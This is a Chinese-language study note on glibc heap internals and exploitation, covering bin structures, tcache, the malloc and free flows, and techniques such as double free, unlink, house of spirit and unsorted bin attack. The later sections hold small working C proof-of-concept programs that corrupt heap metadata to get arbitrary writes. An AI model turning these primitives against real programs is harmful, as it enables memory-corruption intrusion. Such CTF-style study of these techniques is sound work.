# ptmalloc
针对glibc的内存分配器的攻击，目前更新到glibc2.35
# 前置知识
练习：
实现一个双向链表：
-  向前插入，向后插入操作
-  删除·
-  基于这个链表实现队列
-  链表排序

# 堆分配原理
系统调用 : brk(void* end_data_segment)和sbrk(increment)两个系统调用。设置堆顶。
sbrk参数可以为负数，缩小堆。
申请的`size>mp_.mmap_threshold(128*1024=0x20000)` 128k 通过mmap分配内存
关闭ASLR：内存紧挨着BSS段
开启ASLR:  随机。
第一次申请的时候系统直接给了132K内存。
# 整体流程
![[heap.png]]
# 堆攻击原理
目标：通过uaf 溢出等获得内存写（大部分）
# 堆数据结构
Chunk一共有三种状态:
1. Allocated 
2. Free
3. Top
## chunk
 存放chunk的metadata的chunk的结构(header)
```c
struct malloc_chunk{

    size_t prev_size; // 可能被上一个chunk的data覆盖掉，如果上一个chunk没有被使用，则存放chunk 大小
    size_t size;//必须对齐0x10 ，最低二进制位表示上一个chunk是否在使用（PREV_INUSE）,倒数第二位标示是否通过mmap分配(IS_MMAP)
    malloc_chunk *fd; //指向下一个chunk,会被data覆盖
    malloc_chunk *bk;//指向上一个chunk，会被data覆盖
    malloc_chunk *fd_nextsize;//仅在large bin 中使用，会被data覆盖
    malloc_chunk *bk_nextsize;//同上，会被data覆盖
}
```
使用中的chunk
![[chunk_inuse.png]]
free chunk
![](https://www.feishu.cn/space/api/box/stream/download/asynccode/?code=NmViZTZmNjQwYWE0MjdmODYwN2E3NTAxYzNmY2MxOTBfazNMYnQ5ZlBtWmJXajFJUXBoTnNFdjBPY29MVVhrZ0lfVG9rZW46Ym94Y25ma0NRS1JyMjVoY25LYWxuYkZzbWlkXzE2NTQxMzE3Nzg6MTY1NDEzNTM3OF9WNA)
![[free_chunk.png]] 定位到chunk header: `mem=malloc(size)`
-   chunk_head = mem-0x10 （64位）
-   chunk_head = mem-0x08 （32位）
chunk size计算:
-   chunksize是size+8向上对齐16的整数倍

需要注意的时，**[[#2 32|glibc2.32]]增加了safe-linking机制，chunk的fd、bk等指针经过了加密。**
## malloc_state
表示整个arena结构和信息，主线程的arena 是一个全局变量。其他线程在heap段。
-   存在各种bin top chunk信息
-   位于libc的bss段中
-   unsorted bin small bin large bin 组成 一个chunk array：`mchunkptr bins[NBINS * 2 - 2];`
bin 是存放chunk的地方(指针)。

```c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);
  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];
  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;
  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;
  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;
  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;
  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */

  INTERNAL_SIZE_T attached_threads;
  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};

typedef struct malloc_state *mstate;
```

## fast bin
大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。**因为我们把大部分时间花在了合并、分割以及中间检查的过程中。**因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY

```c
typedef struct malloc_chunk *mfastbinptr;
mfastbinptr fastbinsY[]; 
```

其他bin也符合chunk结构，一个指向链表头，一个指向链表末尾。fastbin第二个值（bk）是NULL，因为它是单链表.

- **单链表** LIFO
- Chunk size <= get_max_fast()的chunk，会被放在fastbin的bin里
- get_max_fast():64bit是128bytes，32bit是64bytes
- global_max_fast 一开始是0,set_max_fast(s) 设置为DEFAULT_MXFAST=7，因此最大的bin数量为7
- Fastbin是single linked list，只能使用fd，以NULL结尾
- Chuk Size从32开始，默认共7个可用的fastbin. 32、48、64、80、96、112、128（0x20 0x30 0x40 0x50 0x60 0x70 0x80)
- 32位 fastbin size（0x10 0x18 0x20… 0x40)
- 被释放的chunk不会修改、验证下一个chunk的`PREV_INUSE` 和`PREV_SIZE` 字段。
- 申请large bin 时触发malloc_consolidate() 会合并fast bin 中的chunk 放入unsorted bin或者合并top chunk，清空fast bin。
- bin中的chunk数量是没有限制的。

校验：
- free时检查size参数是否合理、对齐
- malloc时检查下一个chunk size是否和对应的bin一致
- doube free校验，检查和bin中的指针是否相同，相同则检查失败

实验：
测试fastbin 的申请和释放，在pwndbg观察fastbin
1. 小于get_max_fast() 才会放入fastbin
3. 相邻chunk释放不会合并
4. 触发malloc_consolidata()
5. 理解下面的double free过程
6. 理解下面的fast bin consoildate过程

### 攻击手段
1. [[#house_of_spirit]]
2. 覆盖global_max_fast，使得更大的chunk进去fastbin，因为fast bin检查更少：PlaidCTF 2014的datastore、HITCON 2015的fooddb、0CTF 2016的Zerostorage
3. [[#double free]]
4. [[#fast bin consoidate]]
5. [[other#ciscn 2021 lonelywolf|ciscn-2021-lonely-wolf]] 
## unsorted bin
- 只有一个
- FIFO,头部插入，尾部取出。
- bin的bk指向链表尾，fd指向链表头。
- 双向环形链表，主要由bk去查找，因为FIFO
- **当free大小不在fastbin，为了效率，先放入到unsorted bin**，一段时间后(下次malloc 且没找到合适的chunk)再放入对应的bin中，因此 free的时间复杂度是O(1),malloc是O(N).
- 当一个较大的 chunk 被分割成两半(来源large bin）后（bin中没有合适的chunk），如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
- 下次malloc先找unsorted bin中是否有适合的chunk.
- unsorted bin 取出的时不会检查size

验证：
- size不符合不会放入unsorted bin
- 触发合并

用途：
- 泄露libc，因为设置了fd和bk且指向libc中的内存。在`64`位中，一般是`<main_arena+88>`或`<main_arena+96>`具体受`libc`影响。
- 劫持fd和size 分配到任意区域，任意写。
    
实验：
- 编写一个程序观察chunk的fd和bk值和glibc基地址偏移
- 编写一个程序并观察前向合并和后向合并
- 编写一个程序，观察chunk 放入unsorted bin和取出
- 理解下面的first fit过程

```c
#first fit
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
    fprintf(stderr, "glibc uses a first-fit algorithm to select a free chunk.\n");
    fprintf(stderr, "If a chunk is free and large enough, malloc will select this chunk.\n");
    fprintf(stderr, "This can be exploited in a use-after-free situation.\n");

    fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
    char* a = malloc(0x512);
    char* b = malloc(0x256);
    char* c;

    fprintf(stderr, "1st malloc(0x512): %p\n", a);
    fprintf(stderr, "2nd malloc(0x256): %p\n", b);
    fprintf(stderr, "we could continue mallocing here...\n");
    fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n");
    strcpy(a, "this is A!");
    fprintf(stderr, "first allocation %p points to %s\n", a, a);

    fprintf(stderr, "Freeing the first one...\n");
    free(a);

    fprintf(stderr, "We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n", a);

    fprintf(stderr, "So, let's allocate 0x500 bytes\n");
    c = malloc(0x500);
    fprintf(stderr, "3rd malloc(0x500): %p\n", c);
    fprintf(stderr, "And put a different string here, \"this is C!\"\n");
    strcpy(c, "this is C!");
    fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
    fprintf(stderr, "first allocation %p points to %s\n", a, a);
    fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.\n");
}
```
适用全版本glibc
分配的内存要大于fastbin，第一次free后进去unsorted bin，后面的malloc内部打大循环会先把这个chunk放入到large bin，然后再取出。
因为后续分配的内存大小为0x500，虽然小于0x512，但是切割后不满足最小的chunk，因此全部返回给用户。实际上用户拿到的是malloc(0x512)分配的chunk。
把0x500改小可以看到malloc切分chunk的过程，剩余的chunk会继续进入unsorted bin。下次malloc时处理。

### 攻击手段
[[#house_of_rabbit]]

## small bin

-   双向环形链表 FIFO
-   chunk size < 512(32bit) 1024(64bit)
-   free会触发合并。
-   根据大小分成62个大小不同的bin，**有些大小和fastbin重合**
-   16 24…80 88…508


检查
 - 指针前后移植
 
```c
 //check double link list
 //victim 是即将分配的chunk
  else {
                // 获取 small bin 中倒数第二个 chunk 。
                bck = victim->bk;
                // 检查 bck->fd 是不是 victim，防止伪造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
```

### 攻击手段
[[#house_of_lore]]

## large bin
-   双向环形链（sorted)，一共63个bin，分成6组，每组中的chunk大小不一样，有个范围
-   跳表:fd_nextsize 和bk_nextsize
-   chunk size >=512(32bit)
-   不固定大小。
-   前32个bin 512+64…
-   32-48 bin 2496+512…;
-   **每个bin中大的chunk在前面(fd)，小的chunk放在后面(bk)**
-   组 数量 公差
1 32 64B 范围0x200~0x9c0
2 16 512B
3 8 4096B
4 4 32768B
5 2 262144B
6 1 不限制
-   大size 最大的 chunk bk_nextsize 指向最小的 chunk；size 最小的 fd_nextsize 指向最大的 chunk
-   fd_nextsize 指向 size 前面 (更小的) 的 linked list，bk_nextsize 指向 size 后面(更大的) 的
-   相等大小指向自己




## tcache
glibc 2.26 (ubuntu 17.10) 后引入的新的bin，为了速度舍弃了很多安全检查。不过后面又加上了一些检查。

- **tcache的指针直接指向用户数据,而不是chunk header**
 `tcache_perthread_struct`本身也是一个堆块，大小为`0x250`，位于堆开头的位置，包含数组`counts`存放每个`bin`中的`chunk`当前数量，以及数组`entries`存放`64`个`bin`的首地址（可以通过**劫持此堆块**进行攻击）。
```c
typedef struct tcache_perthread_struct
{
//2.31改为uint_16类型
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
# define TCACHE_MAX_BINS                64
static __thread tcache_perthread_struct *tcache = NULL;
```

- 默认链表最长是7。默认64个bin。重叠了fastbin和smallbin
- 64位增长16字节，从24开始，64位范围：24~1032。
- 32位8字节，从12开始，32位范围：12~516
```c
/* With rounding and alignment, the bins are...
idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit)
idx 1 bytes 25..40 or 13..20
idx 2 bytes 41..56 or 21..28
etc. */
```

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
```

- 第一次 malloc 时，会先 malloc 一块内存用来存放 `tcache_perthread_struct` 。
- tcache 之前（<2.27）释放的chunk会放到 fastbin 或者 unsorted bin 中
- tcache 后：
    - free 内存，且 size 小于 small bin size 时直接放入tcache，直到 tcache 被填满（默认是 7 个）
- tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中
- tcache 中的 chunk 不会合并（不取消 inuse bit）
- malloc 内存，且 size 在 tcache 范围内
    - 先从 tcache 取 chunk，直到 tcache bin为空
    - **malloc 时候不会校验count，而是检查bin指针**
    - tcache bin为空后，从 bin 中找如果 `fastbin/smallbin/unsorted bin` 中有 size 符合的 chunk，**会先把** `**fastbin/smallbin/unsorted bin**` **中的 chunk 放到 tcache 中**，**直到填满。之后再从 tcache 中取**； 因此， **chunk 在 bin 中的顺序和 tcache 中的顺序会反过来。**（tcache stashing)
    - tcache bin 为空时，会去对fd指针解引用，因此fd必须有效。
- 2.27 后面的更新增加了key字段，实际上就是chunk的bk，这个字段在放入bin时会设置为 `tcache_perthread_struct` 的地址。在free()操作时进行校验。实际上绕过也非常容易，随便设置一个值即可。

### tcache_get()


```c
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```



### tcache_put()

```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

`tcache_puts()` 完成了把释放的 chunk 插入到 `tcache->entries[tc_idx]` 链表头部的操作，也几乎没有任何保护。并且 **没有把 prev_inuse位置零**。

实验：
1. 构造两个tcache bin chunk 观察fd指针和tcache_struct 中的count变化。
2. 构造一个fast bin chunk
3. 

### 攻击手段
1. [[#house_of_spirit with tcache]]
2. double free,但是要改`tcache_perthread_struct` 来获得更多free的次数。因为malloc的次数是大于free的。count为0后就只能去切分top chunk了。

## Top_chunk

arena的边界。都没有bin可用的时候从这里切下来。需要的空间过大时则会通过brk系统调用增长。
### 攻击手段
1. [[#house_of_force]]
2. 劫持`main_arena`中的`top_chunk`任意地址分配

## Last remainder chunk

chunk分割时，保存剩余的部分。在unsorted bin中。


# 堆释放和分配流程

释放比分配流程简单很多，因为释放的算法是O(1)的，即释放内存和大小，内存块的数量都无关。
分配流程需要根据堆中释放的内存块(chunk)执行策略重分配。
堆内存算法要应对内存碎片、性能等问题，因此设计很复杂。
下面描述的堆分配过程是基于2.23的，2.26增加tcache的过程在后面详细描述。


### \_\_libc_free (void \*mem)
用户调用free函数首先跳转到这里

1.  如果mem为NULL直接返回
2.  chunk被mmapped，调用munmap_chunk释放。
3.  拿到chunk属于的arena 指针。
4.  调用[[#_int_free mstate av mchunkptr p int have_lock|_int_free]]


### \_int_free (mstate av, mchunkptr p, int have_lock)
p是要释放的指针，av是上一步得到的arena指针。
大致流程，小内存插入fastbin，大内存要么合并，要么放入unsorted bin。
1. **检查**chunk_size,不能大的离谱(超过系统内存等)
2. **检查**p要对齐，SIZE要大于MINSIZE，SIZE要对齐
3. 如果size 在fastbin范围中
  - **检查**下一个chunk_size不能大于av->system_mem
  - 调用free_perturb填充内存
  - 设置av的FASTCHUNKS_BIT。
  - 根据大小拿到对应bin地址。
  - **检查**bin中 指向的chunk!=p（double free check）
  - **检查b**in中的chunk大小是否和要free的一致
  - 插入链表最前面，返回。
4. chunk没有被mmapped
  - **检查**是否是top chunk.. 
  - **检查**next_cunk是否在arena范围内，即当前chunk不能太大
  - **检查**next_chunk的PREV_INUSE!=0
  - **检查**下一个chunk 大小是否在MINSIZE和av->system_mem之间
  - 调用free_perturb填充内存
  - 如果下一个chunk是top_chunk，合并到top chunk并增加top_chunk大小。如果合并后大于FASTBIN_CONSOLIDATION_THRESHOLD，则调用[[#void malloc_consolidate mstate av|malloc_consolidate]] 然后返还内存给系统。
  - 如果下一个chunk不是top_chunk，且没有被使用（已经被释放），调用[[#unlink|unlink_chunk]]将下一个chunk取出 ，前向合并（增加size）加入unsorted bin。
  - 如果下一个chunk不是top chunk,且在使用（已分配）通过`set_foot` 设置下一个chunk的prev_size，通过`clear_inuse_bit_at_offset` 清空PREV_INUSE 位。
5. chunk被mmaped，调用munmap_chunk 。

### \_\_libc_malloc (size_t bytes)

用户态调用的malloc函数会跳转到这里。注意这个bytes的数据类型，他是无符号的。
0. 先检查是否有malloc_hook函数，如果有则调用并返回。
1. 调用`arena_get` 拿到mstate 指针
2. 调用[[#void _int _malloc mstate av size_t bytes|_int_malloc]]传入上面的指针和大小。
3. 解锁arena，多线程安全
4. 检查：
    -   返回指针!=NULL 或 ↓
    -   MMAPPED  或  ↓
    -   chunk是属于mstate。
5. 最后返回内存

## void * \_int\_malloc (mstate av, size_t bytes)
内部分配内存实际逻辑。
大致流程：大内存直接mmap，小内存如果没有空闲或者满足条件的chunk，切分top chunk。有空闲chunk，大循环便利unsorted bin，根据chunk大小分类，然后返回合适的。
malloc的过程较复杂，里面舍去了大部分检查过程，具体检查在各个bin中。

1. 对齐bytes，检查av是否为null
2. av没有初始化，调用sysmalloc（使用mmap）获取堆。
3. size在fastbin区间，移除bin中的chunk并拿到对应的指针(victim 变量）
  1. 若victim不为空，检查拿到的chunk size是否属于当前bin，不属于则报错"malloc(): memory corruption (fast)")，最后调用alloc_perturb返回指针。
  2. 若victim为空，则查找small bin 因为small bin和fast bin有重叠。
4. size在smallbin区间，找对对应的bin,通过bin->bk确定bin是否为空，
  1. 不为空，**检查**victim->bk->fd\=\=victim ，不相等则("malloc(): smallbin double linked list corrupted")。设置PREV_INSUSE在next_chunk上。从这个bin里取出这个chunk。设置合适的 arena bit 。调用alloc_perturb返回指针。
  2. 为空，调用malloc_consolidate 合并fast bin。
5. size在largebin区间。不扫描large bin，先调用malloc_consolidate合并fastbin放到unsorted bin中，不够合并直接进入unsorted bin。
6. 遍历unsorted bin。没有fastbin 和small bin chunk 可用时遍历unsorted bin。
  - 从尾部开始遍历，因为FIFO数据结构。
  - 检查chunk大小，必须在2*SIZE_SZ~av->system_mem之间。否则抛出"malloc(): memory corruption"
  - 如果请求大小在small bin之间但smallbin没有合适的chunk。
    - unsorted bin中只有一个chunk，切分chunk，剩余的放回到unsorted bin中。
    - 有多个chunk，如果大小精确匹配，直接返回。否则将这个chunk插入small bin中的头部。
  - 大小不匹配（large bin)，插入large Bin中对应的顺序。如果和bin中已有的chunk大小相同，则插入到它后面。
    - 在large bin 中大小最小：fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; fwd就是largebin本身
    - 和某个chunk相等 fwd = fwd->fd; bck = fwd->bk;
  - 最多循环MAX_ITERS (10000) 次或者所有的chunk都被释放掉。

7. 没有符合上述要求的chunk。检查large bin。
  - 从后到前寻找合适的chunk(最小size>small size)
    - 如果正好大小匹配则返回
    - 不匹配计算切分后的大小，若大于MINSIZE则插入到unsorted bin中，检查unsorted_chunks(av)->fd->bk == unsorted_chunks(av)，另一块返回给用户。
8. 依然没有可用个bin，且requested size < =top chunk size 切分top_chunk，返回给用户后，剩余的成为新的top_chunk，调用malloc_consolidate合并fastbin。

## sysmalloc

top_chunk不够用且分配内存小于`mp_.mmap_threshold`（默认DEFAULT_MMAP_THRESHOLD=128k）时启用。
增加top_chunk，**旧的top_chunk进入对应的bin** .
第一次分配检查：`old_top == initial_top(av) && old_size == 0` 旧heap大小应该是0.
新的堆：
1.  `(unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top)` 旧**堆大小要大于**`**MINSIZE**`**且上一个chunk在使用。**
    
2.  `(unsigned long)old_end & (pagesize - 1)) == 0)` **堆的结束地址是页对齐的（0x1000)**

## void malloc_init_state (mstate av)

只在[[#void malloc_consolidate mstate av|malloc_consolidate]]里调用。初始化除了fastbin外其他的bins;
因为fastbin是单独的数组，其他bins是合并在一个大数组的。
初始化max_fast 系列变量等。
设置av的flag:FASTCHUNKS_BIT
av->top 初始化到unsorted bin里。

## void malloc_consolidate(mstate av)

1. 若fastbin未初始化，初始化fastbin
2. 已经初始化，合并fastbin中的chunk 放入到unsorted bin中。

## 新版增加tcache后的分配过程
### free
调用[[#tcache_put]]优先放tcache bin，满了放对应的fastbin或者unsorted。
\_int_free() 中的改动：
判断 `tc_idx` 合法，`tcache->counts[tc_idx]` 在 7 个以内时，就进入 `tcache_put()`，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。

```
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache
        && tc_idx < mp_.tcache_bins // 64
        && tcache->counts[tc_idx] < mp_.tcache_count) // 7
      {
        tcache_put (p, tc_idx);
        return;
      }
  }
#endif
```
### malloc
1. 查找tcache bin 有空闲立即返回，调用[[#tcache_get]]
2. 小于fast bin最大大小，遍历fast bin，同时如果tcache bin有空位，则取出放到tcache bin中。
3. 在small bin 范围内，搜索small bin，如果tcache bin有空位，则取出放到tcache bin中。
其他和旧版相同



# 攻击
## uaf
通用攻击方法。
例题，[[pwnable.tw#hacknote]]

## double free
fastbin double free
glibc: >2.31 需要注意tcache问题。
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  char *a, *b;
  a = malloc(0x30);
  b = malloc(0x30);
  free(a);
  free(a);
}
```
编译运行，然后报错
```
./a.out
*** Error in `./a.out': double free or corruption (fasttop): 0x0000556e2933e010 ***
[1]    3066 abort      ./a.out
```
修改代码后”正常“运行
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  char *a, *b, *c;
  puts("flush out stream");
  a = malloc(0x70);
  b = malloc(0x70);
// firest free a then free b
  free(a); 
  free(b);
  free(a);
  //  c = malloc(0x70);
  printf("malloc 1: %p\n", malloc(0x70));
  printf("malloc 2: %p\n", malloc(0x70));
  printf("malloc 3: %p\n", malloc(0x70));
  printf("malloc 4: %p\n", malloc(0x70));
  printf("malloc 5: %p\n", malloc(0x70));
  printf("malloc 6: %p\n", malloc(0x70));
  printf("malloc 7: %p\n", malloc(0x70));
}
```
此时堆结构已经坏掉了，fastbin链表形成了环(分配的地址只在两个之间来回循环)
```c
./a.out
flush out stream
malloc 1: 0x561422e45420
malloc 2: 0x561422e454a0
malloc 3: 0x561422e45420
malloc 4: 0x561422e454a0
malloc 5: 0x561422e45420
malloc 6: 0x561422e454a0
malloc 7: 0x561422e45420
```



## unlink
unlink使用频率很多，是一个宏实现。unlink的chunk P假定已经在链表中了。
源码

version:2.23
```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");           \
    FD = P->fd;                     \
    BK = P->bk;                     \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))         \
      malloc_printerr ("corrupted double-linked list");           \
    else {                      \
        FD->bk = BK;                    \
        BK->fd = FD;                    \
        if (!in_smallbin_range (chunksize_nomask (P))           \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {          \
      if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        \
    || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
        malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {              \
                if (P->fd_nextsize == P)              \
                  FD->fd_nextsize = FD->bk_nextsize = FD;         \
                else {                    \
                    FD->fd_nextsize = P->fd_nextsize;           \
                    FD->bk_nextsize = P->bk_nextsize;           \
                    P->fd_nextsize->bk_nextsize = FD;           \
                    P->bk_nextsize->fd_nextsize = FD;           \
                  }                   \
              } else {                    \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;         \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;         \
              }                     \
          }                     \
      }                       \
}
```
version:2.31
```c
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  bk->fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
    {
      if (p->fd_nextsize->bk_nextsize != p
          || p->bk_nextsize->fd_nextsize != p)
        malloc_printerr ("corrupted double-linked list (not small)");

      if (fd->fd_nextsize == NULL)
        {
          if (p->fd_nextsize == p)
            fd->fd_nextsize = fd->bk_nextsize = fd;
          else
            {
              fd->fd_nextsize = p->fd_nextsize;
              fd->bk_nextsize = p->bk_nextsize;
              p->fd_nextsize->bk_nextsize = fd;
              p->bk_nextsize->fd_nextsize = fd;
            }
        }
      else
        {
          p->fd_nextsize->bk_nextsize = p->bk_nextsize;
          p->bk_nextsize->fd_nextsize = p->fd_nextsize;
        }
    }
}
```
古老的UNink攻击没有检查fd和bk和size，容易绕过，现在的unlink多了检查fd和bk指针。
1. **检查chunk大小和下一个chunk->prev_size是否相等**
2. **检查fd、bk的指针要正确。** P->bk->fd\=\=P && P->fd->bk\=\=P(corrupted double linked list)
3. 断开nextsize链表,**检查指针**
4. 先修改下一个chunk的bk指针，再修改上一个chunk的fd指针

unlink结束后会合并相邻未分配的chunk，然后放入到unsorted bin中(malloc 过程)


条件：
0. 需要一个可读写的chunk p，知道&p（p是global的）
1. UAF,可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
2. 已知位置存在一个指针指向可进行 UAF 的 chunk

使用：
设置p的fd和bk，
- FD=P->fd=&P-0x18
- BK=P->bk=&p-0x10
- 结果：p=&p-0x18 ，p指向了p的地址-0x18

unlink_write:
```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
  char *a, *b;
  a = malloc(0x40);
  b = malloc(0x420);
  malloc(0x10);
  free(a);
  // uaf
  size_t *uaf_chunk = a - 0x10;
  // bypass prev_size vs size check
  *((size_t *)b - 2) = 0x50;
  *((size_t *)b - 1) ^= 0x1;
  // fd
  *(uaf_chunk + 2) = (size_t)&uaf_chunk - 0x18;
  // bk
  *(uaf_chunk + 3) = (size_t)&uaf_chunk - 0x10;
  free(b);

  printf("%p\n", uaf_chunk);
  printf("%p\n", &uaf_chunk);
  return 0;
}

```

效果:
1. 构造出一个可以任意写的chunk

## fast bin consolidate

1. 直接利用，uaf越界写fd，然后伪造size分配到目标地址
glibc>2.26需要注意tcache问题。
```c 
#include<stdlib.h>
#include<stdio.h>
int main(){
    //target data
    size_t data[5]={0x21,0,0,0,1};
    char *a=malloc(0x10);
    free(a);
    //attack by uaf
    *(size_t*)a=(size_t)&data-0x8;
    malloc(0x1000);
    size_t *b=malloc(0x10);
    *b=0x61;
    printf("%lx\n",data[1]);
}
```
2. malloc比较大的chunk时触发了堆合并，结果fastbin中的chunk被整理到了small bin中。最后free制造了环。
glibc:2.35
```c
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
  puts("This is a powerful technique that bypasses the double free check in "
       "tcachebin.");
  // ----------------------------------------------------------------
  printf("Fill up the tcache list to force the fastbin usage...\n");
  void *ptr[7];
  for (int i = 0; i < 7; i++)
    ptr[i] = malloc(0x40);
  for (int i = 0; i < 7; i++)
    free(ptr[i]);
  // ----------------------------------------------------------------

  void *p1 = calloc(1, 0x40);
  void *p2 = calloc(1, 0x40);

  // attack
  free(p1);
  void *p3 = malloc(0x400);
  printf("Triggering the double free vulnerability!\n\n");
  free(p1);
  // ---------------------------------------------------------------
  // clean tcachebin
  for (int i = 0; i < 7; i++)
    ptr[i] = malloc(0x40);
//----------------------------------------------------------------------
  void *p4 = malloc(0x40);
  void *p5 = malloc(0x40);

  assert(p5 == p4);

  printf("point to p5: p5=%p, p4=%p\n\n", p5, p4);
}
```

## house_of_spirit

**将栈内存放入fastbin中**
关键在于伪造两个`fastbin chunk header`.然后覆盖一个堆指针变量使其指向第一个`fast bin chunk`,`free`后再`malloc`使两个`fast bin chunk`间的区域可控.
条件：
- free的chunk size要在对应的fastbin中。
-   需要绕过free操作中**next chunk size**判断：不能太大也不能太小。

这个样例需要 2.26<=glibc<2.32版本，低版本注释掉tcache的部分即可
```c
#include <stdio.h>
#include <stdlib.h>

int main() {

  char *disable_tcache[8];
  unsigned long long *a;
  unsigned long long fake_chunks[10] __attribute__((aligned(16)));

  for (int i = 0; i < 7; i++) {
    disable_tcache[i] = malloc(0x30);
  }
  for (int i = 0; i < 7; i++) {
    free(disable_tcache[i]);
  }

  // fake size
  fake_chunks[1] = 0x40;

  // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
  // fake next chunk size
  fake_chunks[9] = 0x1234;

  // free a pointer on the stack;
  a = &fake_chunks[2];
  free(a);

  for (int i = 0; i < 7; i++) {
    disable_tcache[i] = malloc(0x30);
  }

  fprintf(stderr,
          "the next malloc will return the region of our fake chunk at %p, "
          "which will be %p!\n",
          &fake_chunks[1], &fake_chunks[2]);
  fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

劫持data段数据。
```c
#include <stdio.h>
#include <stdlib.h>

size_t fake_size = 0x81;
char hijack_this_str[0x20] = "hhhhhhh\n";
int main() {
  char *a, *b, *c;
  a = malloc(0x70);
  b = malloc(0x70);

  printf("before hijack:%s", hijack_this_str);
  // firest free a then free b
  free(a);
  free(b);
  free(a);
  *(size_t *)a = (size_t)hijack_this_str - 0x28;
  malloc(0x70);
  a = malloc(0x70);
  *(size_t *)(a + 0x18) = 0x6161616161616161;
  printf("hijack_this_str:%s\n", hijack_this_str);
}

```

## house_of_spirit with tcache

和fastbin版本的攻击手段相同，但是不需要伪造下一个chunk的size。
- 注意：伪造的fd 对应的next指针可读。

## Unsorted bin attack
结果：
1. 目标地址+指针长度被写成libc段中的一个地址
  1. bin中的chunk->bk为目标地址
  2. 如果不bypass glibc的检查，那么heap就此崩坏，后面的malloc操作可能会触发abort。
  3. 劫持到main_arena，可以修改global_max_fast，增大fastbin范围、或者修改程序循环次数等。
2. 返回目标地址指针: 
  1. bin中的chunk->bk可控
  2. chunk size>bin中的chunk&& chunk size <目标地址->size
  3. 其他bypass
```c
bck = victim->bk;
/* code */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);//*(fake_bk + 0x10) = unsorted_chunks (av)

if (size == nb) {
        set_inuse_bit_at_offset (victim, size);
  if (av != &main_arena)
                set_non_main_arena (victim);
  check_malloced_chunk (av, victim, nb);
  void *p = chunk2mem (victim);
  alloc_perturb (p, bytes);
  return p;
}
```

需要把unsorted_bin中剩下的chunk一下申请完,否则会因为分裂chunk报错.
#todo
添加样例
## off by one
